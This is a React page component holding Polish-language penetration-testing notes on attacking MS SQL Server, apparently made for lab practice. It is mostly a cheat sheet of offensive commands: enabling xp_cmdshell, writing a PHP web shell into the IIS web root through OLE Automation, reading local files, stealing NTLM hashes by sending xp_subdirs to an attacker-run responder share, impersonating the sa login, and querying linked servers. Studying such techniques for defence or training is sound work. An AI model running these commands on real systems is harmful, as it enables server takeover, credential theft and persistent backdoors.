import mssql from '../../../assets/mssql.png';
import mssql_our_user from '../../../assets/mssql_our_user.png';
import mssql_identyfi_user from '../../../assets/mssql_identyfi_user.png';
import mssql_local_base from '../../../assets/mssql_local_base.png';
import mssql_hash_steal from '../../../assets/mssql_hash_steal.png';
import mssql_mssqlclient from '../../../assets/mssql_mssqlclient.png';
import ExampleFrame from '../../exampleFrame/ExampleFrame';

const MsSql = () =>{
    return(
        <section>
            <h1>MS SQL</h1>
            <p>Microsoft SQL (MSSQL) to system zarządzania relacyjnymi bazami danych firmy Microsoft oparty na języku SQL.</p>
            <p>Dostęp do bazy danych działającej w MSSQL można uzyskać za pomocą wielu innych klientów. W tym między innymi:</p>
            <ul>
                <li>mssql-cli</li>
                <li>SQL Server PowerShell</li>
                <li>HeidiSQL</li>
                <li>SQLPro</li>
                <li>Impacket's mssqlclient.py</li>
            </ul>
            <ExampleFrame screen={mssql} />

            <hr />
            <h2>Łączenie przez Mssqlclient.py</h2>

            <div className='waring'>
                <p>python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth</p>
            </div>

            <ExampleFrame screen={mssql_mssqlclient} />
            <hr/>
            <h2>XP_CMDSHELL</h2>

            <div className='waring'>
                <p>xp_cmdshell 'whoami'</p>
                <p>GO</p>
            </div>

            <p>Jeżeli mamy uprawnienia możemy włączyć opcję cmdshell</p>

            <div className='waring'>
                <p>Aby umożliwić zmianę opcji zaawansowanych.</p>
                <p>EXECUTE sp_configure 'show advanced options', 1</p>
                <p>GO</p>
                <br />
                <br />
                <p>Aby zaktualizować aktualnie skonfigurowaną wartość opcji zaawansowanych.</p>
                <p>RECONFIGURE</p>
                <p>GO</p>
                <br />
                <br />
                <p>Aby włączyć tę funkcję.</p>
                <p>EXECUTE sp_configure 'xp_cmdshell', 1</p>
                <p>GO</p>
                <br />
                <br />
                <p>Aby zaktualizować aktualnie skonfigurowaną wartość tej funkcji.</p>
                <p>RECONFIGURE</p>
                <p>GO</p>
            </div>

            <hr />
            <div className='waring'>
                <p>sp_configure 'show advanced options', 1</p>
                <p>GO</p>
                <p>RECONFIGURE</p>
                <p>GO</p>
                <p>sp_configure 'Ole Automation Procedures', 1</p>
                <p>GO</p>
                <p>RECONFIGURE</p>
                <p>GO</p>
            </div>
            <div className='waring'>
                <p>DECLARE @OLE INT</p>
                <p>DECLARE @FileID INT</p>
                <p>EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT</p>
                <p>EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1</p>
                <p>EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '{`<`}?php echo shell_exec($_GET["c"]);?{`>`}'</p>
                <p>EXECUTE sp_OADestroy @FileID</p>
                <p>EXECUTE sp_OADestroy @OLE</p>
                <p>GO</p>
            </div>

            <hr />
            <h2>odczytywane lokalnych plików</h2>
            <div className='waring'>
                <p>SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents</p>
                <p>GO</p>
            </div>

            <hr />
            <h2>XP_DIRTREE Hash Stealing</h2>
            <div className='waring'>
                <p>responder -I tun0</p>
                <p>EXEC master..xp_subdirs '\\10.10.110.17\share\'</p>
                <p>GO</p>
            </div>
            <ExampleFrame screen={mssql_hash_steal} />

            <hr />
            <h2>Podszywać się pod istniejących użytkowników</h2>
            <h3>Identyfikuj użytkowników, pod których możemy się podszywać</h3>

            <div className='waring'>
                <p>SELECT distinct b.name</p>
                <p>FROM sys.server_permissions a</p>
                <p>INNER JOIN sys.server_principals b</p>
                <p>ON a.grantor_principal_id = b.principal_id</p>
                <p>WHERE a.permission_name = 'IMPERSONATE'</p>
                <p>GO</p>
            </div>
            <ExampleFrame screen={mssql_identyfi_user} />

            <h2>Weryfikacja naszego bieżącego użytkownika i roli</h2>

            <div className='waring'>
                <p>SELECT SYSTEM_USER</p>
                <p>SELECT IS_SRVROLEMEMBER('sysadmin')</p>
                <p>GO</p>
            </div>

            <ExampleFrame screen={mssql_our_user} />
            <p>zwrócona wartość <span className='important'>0</span>, nie mamy roli sysadmin</p>

            <h3>Podszywanie się pod Użytkownika SA</h3>

            <div className='waring'>
                <p>EXECUTE AS LOGIN = 'sa'</p>
                <p>SELECT SYSTEM_USER</p>
                <p>SELECT IS_SRVROLEMEMBER('sysadmin')</p>
                <p>GO</p>
            </div>

            <hr />
            <h2>Komunikuj się z innymi bazami danych za pomocą MSSQL</h2>

            <div className='waring'>
                <p>SELECT srvname, isremote FROM sysserver</p>
                <p>GO</p>
            </div>
            <div className='waring'>
                <p>EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]</p>
                <p>GO</p>
            </div>
            <ExampleFrame screen={mssql_local_base} />
        </section>
    )
}

export default MsSql;